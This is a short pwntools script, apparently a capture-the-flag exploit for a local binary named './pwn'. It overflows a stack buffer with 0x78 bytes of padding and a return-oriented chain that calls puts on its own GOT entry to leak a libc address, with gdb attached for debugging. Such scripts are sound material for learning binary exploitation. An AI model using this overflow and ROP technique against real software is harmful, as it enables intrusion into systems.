from pwn import *
# p = process('./runner')
context.log_level='debug'
context.arch = 'amd64'
p=process('./pwn')
elf=ELF('./pwn')
p.recvuntil(b'$ ')
p.sendline(b'O.O')
p.recvuntil(b'> ')
p.sendline(b'O.O')
gdb.attach(p,'b *0x00000000004017D6')
pause()
bug_addr=0x00000000004016C8
pop_rdi=0x0000000000401bb3
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
payload=b'a'*0x78+flat([pop_rdi,puts_got,puts_plt,bug_addr])
p.sendline(payload)
p.interactive()

